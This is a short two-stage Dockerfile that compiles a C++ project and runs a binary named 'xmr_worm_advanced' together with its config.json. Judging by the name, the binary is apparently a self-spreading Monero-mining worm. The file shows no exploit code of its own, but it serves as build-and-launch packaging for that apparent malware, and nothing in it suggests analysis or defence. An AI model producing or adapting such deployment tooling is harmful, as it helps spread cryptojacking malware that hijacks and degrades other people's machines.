# ── Stage 1: Build ──────────────────────────────────────────────
FROM ubuntu:22.04 AS builder

RUN apt-get update && apt-get install -y \
    build-essential \
    cmake \
    git \
    libssl-dev \
    libcurl4-openssl-dev \
    nlohmann-json3-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY . .

RUN git submodule update --init --recursive \
    && cmake -B build -DCMAKE_BUILD_TYPE=Release \
    && cmake --build build -j$(nproc)

# ── Stage 2: Runtime ────────────────────────────────────────────
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y \
    libssl3 \
    libcurl4 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY --from=builder /app/build/xmr_worm_advanced .
COPY --from=builder /app/config.json .

CMD ["./xmr_worm_advanced"]
